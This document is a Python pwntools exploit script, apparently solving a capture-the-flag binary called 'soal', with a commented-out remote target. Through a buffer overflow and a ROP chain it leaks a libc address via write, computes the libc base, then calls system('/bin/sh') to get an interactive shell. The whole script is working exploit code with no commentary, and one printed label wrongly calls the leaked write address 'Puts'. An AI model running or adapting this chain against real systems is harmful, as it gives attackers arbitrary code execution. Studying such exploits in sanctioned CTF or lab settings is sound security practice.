from pwn import *

exe = ELF("./soal")

r = process('./soal')

# r = remote("localhost",13302)
# r = remote("3.16.22.242",13302)
libc=ELF("libc-2.31.so")

tools=0x0000000000401257
poprdi=0x000000000040131b
poprsi=0x0000000000401319

gdb_script = '''
	b *0x0000000000401257
	b *0x00000000004012b9
	b *0x00000000004012a1
	# c
	# c
	# c
	# c
	'''

p='a'*40
p+='\x57'
r.send(p)

p =  p64(exe.sym["buff_another"])
p += p64(poprdi)
p += p64(1)
p += p64(poprsi)
p += p64(exe.got['write'])
p += p64(0)
p += p64(exe.plt['write'])
p += p64(0x0000000000401314) # pop    r12
p += p64(0)*4
# p += p64(0x0000000000401182)
p += p64(0x00000000004012a1)
# p += p64(poprdi)
# p += p64(exe.got['puts'])
# p += p64(exe.plt['puts'])
#
r.sendafter("(yes/no): ", p)

# gdb.attach(r,gdbscript=gdb_script)

p =  "a" * 32
p += p64(exe.sym["buff_another"])
p += p64(0x00000000004012b8)
r.sendafter("use: \n", p)

leak = u64(r.recv(6).ljust(8,'\x00'))
print '[+] Puts Address :',
print hex(leak)
libc.address = leak - libc.sym["write"]
print '[+] Base Address :',
print hex(libc.address)

pop_rdx = libc.address + 0x00000000000cb1cd
pop_rsi = libc.address + 0x000000000002890f
OFFSET_GADGET = [0xcbcba, 0xcbcbd, 0xcbcc0]

p= "B" * 40
# p+=p64(libc.address + OFFSET_GADGET[0] )

p+= p64(poprdi)
p+= p64(libc.search('/bin/sh\x00').next())
p += p64(pop_rsi)
p += p64(0)*2
p += p64(pop_rdx)
p += p64(0)
p+= p64(libc.sym['system'])

r.sendline(p)

r.interactive()
